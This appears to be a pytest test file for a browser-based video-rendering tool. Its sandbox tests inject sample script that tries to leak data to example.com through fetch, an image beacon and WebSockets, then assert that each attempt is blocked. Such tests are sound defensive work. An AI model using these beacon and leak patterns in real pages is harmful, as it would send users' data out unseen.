import pytest

from conftest import HELLO_JS
from lv import narrate, page, render, sfx, tools
from lv.util import UserError, read_text


def test_output_path_layout(make_chapter):
    ch = make_chapter([{"id": "a", "min": 1}], out="Entry 5/6: Keys.mp4")
    assert page.output_dir(ch) == ch.parent.parent
    assert page.output_path(ch, {"out": "Entry 5/6: Keys.mp4"}).name == "Entry 5-6- Keys.mp4"


def test_stills_and_render(make_chapter, fake_speak, browser_ok):
    sfx.build()
    ch = make_chapter([{"id": "hello", "say": "Hello there, students.", "min": 2}], HELLO_JS)
    narrate.narrate(ch, speak_fn=fake_speak)
    sheet = render.stills(ch, [0.5, 1.5])
    assert sheet.exists() and len(list((ch / "build/stills").glob("t*.jpg"))) == 2
    out = render.render(ch, workers=2)
    assert out == ch.parent.parent / "Chapter 1 - Test.mp4"
    assert abs(tools.duration(out) - narrate.read_timing(ch)["duration"]) < 0.2
    assert {"video", "audio"} <= tools.streams(out)
    assert read_text(out.with_suffix(".vtt")).startswith("WEBVTT")
    assert (ch / "build" / "final.jpg").exists()  # frames from the finished MP4, for the last visual check


def test_render_reports_page_error(make_chapter, fake_speak, browser_ok):
    ch = make_chapter([{"id": "hello", "min": 1}], "throw new Error('boom in scenes');\n")
    narrate.narrate(ch, speak_fn=fake_speak)
    with pytest.raises(UserError) as e:
        render.stills(ch, [0.5])
    assert "boom in scenes" in str(e.value)


def test_render_reports_missing_asset(make_chapter, fake_speak, browser_ok):
    js = "Engine.assets({ pic: 'assets/nope.jpg' });\n" + HELLO_JS
    ch = make_chapter([{"id": "hello", "min": 1}], js)
    narrate.narrate(ch, speak_fn=fake_speak)
    with pytest.raises(UserError) as e:
        render.render(ch, workers=1)
    assert "assets/nope.jpg" in str(e.value)


def test_render_needs_narration_first(make_chapter):
    ch = make_chapter([{"id": "hello", "min": 1}], HELLO_JS)
    with pytest.raises(UserError) as e:
        render.render(ch)
    assert "narrate" in str(e.value)


def test_wander_spreads_particles(make_chapter, fake_speak, browser_ok):
    ch = make_chapter([{"id": "hello", "min": 1}], HELLO_JS)
    narrate.narrate(ch, speak_fn=fake_speak)
    page.ensure_page(ch)
    with render.page_for(ch) as (pg, logs):
        xs = pg.evaluate("[...Array(20)].map((_, i) => Engine.wander(i, 0, {x: 0, y: 0, w: 1000, h: 1000}, 3)[0])")
    assert max(xs) - min(xs) > 600, xs


@pytest.mark.parametrize("js,needle", [
    ("scene('hello', (g, t, s) => { Engine.clip(g, 'assets/clip_nope', 192, t, 0, 0, 640, 360); });\n", "assets/clip_nope/"),
    ("scene('hello', (g, t, s) => { Engine.img(g, 'nokey', 0, 0, 640, 360); });\n", '"nokey"'),
    ("scene('other', (g, t, s) => {});\n", 'no scene() for "hello"'),
])
def test_render_reports_silent_gray(make_chapter, fake_speak, browser_ok, js, needle):
    ch = make_chapter([{"id": "hello", "min": 1}], js)
    narrate.narrate(ch, speak_fn=fake_speak)
    with pytest.raises(UserError) as e:
        render.stills(ch, [0.5])
    assert needle in str(e.value)


def test_render_builds_sound_effects_when_missing(make_chapter, fake_speak, browser_ok, capsys, lv_home):
    assert not (lv_home / "sfx").exists()
    ch = make_chapter([{"id": "hello", "min": 1}], HELLO_JS)
    narrate.narrate(ch, speak_fn=fake_speak)
    render.render(ch, workers=1)
    assert "unknown sound effects skipped" not in capsys.readouterr().out


def test_page_cannot_reach_the_network(make_chapter, fake_speak, browser_ok):
    js = ("fetch('https://example.com/x?leak=1').catch(() => {});\n"
          "new Image().src = 'https://example.com/beacon.png';\n"
          "try { new WebSocket('wss://example.com/ws'); } catch (e) {}\n" + HELLO_JS)
    ch = make_chapter([{"id": "hello", "min": 1}], js)
    narrate.narrate(ch, speak_fn=fake_speak)
    page.ensure_page(ch)
    with render.page_for(ch) as (pg, logs):
        got = pg.evaluate("fetch('http://203.0.113.9/y').then(() => 'reached', () => 'blocked')")
        pg.wait_for_timeout(300)
        blocked = [l for l in logs if l.startswith("blocked:")]
        assert got == "blocked"
        for url in ("https://example.com/x?leak=1", "https://example.com/beacon.png", "http://203.0.113.9/y"):
            assert any(url in l for l in blocked), (url, blocked)
        assert pg.evaluate("window.__ready") is True  # the page's own files still load


def _lan_ip():
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("192.0.2.1", 9))  # picks the outgoing interface; sends nothing
        ip = s.getsockname()[0]
    except OSError:
        return None
    finally:
        s.close()
    return None if ip.startswith("127.") else ip


def test_browser_itself_reaches_only_the_local_page_server(browser_ok):
    """The browser layer alone (no Playwright routes): 127.0.0.1 works; this Mac's own network address, an IP
    literal, a host name and a WebSocket all fail. The LAN server counts hits, so this needs no internet."""
    import http.server
    import threading
    from playwright.sync_api import sync_playwright
    from lv import chromium
    hits = []

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            body = b"<html><body>ok</body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    lan = _lan_ip()
    try:
        with sync_playwright() as p:
            browser = chromium.launch(p)
            try:
                pg = browser.new_page()
                pg.goto(f"http://127.0.0.1:{port}/page")
                assert hits == ["/page"]
                probe = """async (url) => { try { await fetch(url); return 'reached'; } catch (e) { return 'failed'; } }"""
                for url in ([f"http://{lan}:{port}/lan"] if lan else []) + ["http://93.184.216.34/", "http://example.com/"]:
                    assert pg.evaluate(probe, url) == "failed", url
                ws_urls = ([f"ws://{lan}:{port}/ws"] if lan else []) + ["ws://example.com/"]
                states = pg.evaluate("""async (urls) => {
                    const out = [];
                    for (const u of urls) {
                        const ws = new WebSocket(u); let opened = false;
                        ws.onopen = () => { opened = true; };
                        await new Promise(r => setTimeout(r, 1500));
                        out.push(opened || ws.readyState === 1 ? 'open' : 'never opened');
                    }
                    return out; }""", ws_urls)
                assert states == ["never opened"] * len(ws_urls)
                assert hits == ["/page"]  # nothing but the page itself reached the server
            finally:
                browser.close()
    finally:
        srv.shutdown()
        srv.server_close()


def test_rendering_page_websocket_never_opens(make_chapter, fake_speak, browser_ok):
    js = ("window.__ws = new WebSocket('ws://example.com/'); window.__wsOpened = false;\n"
          "window.__ws.onopen = () => { window.__wsOpened = true; };\n" + HELLO_JS)
    ch = make_chapter([{"id": "hello", "min": 1}], js)
    narrate.narrate(ch, speak_fn=fake_speak)
    page.ensure_page(ch)
    with render.page_for(ch) as (pg, logs):
        pg.wait_for_timeout(1500)
        assert pg.evaluate("window.__wsOpened") is False
        assert pg.evaluate("window.__ws.readyState") != 1
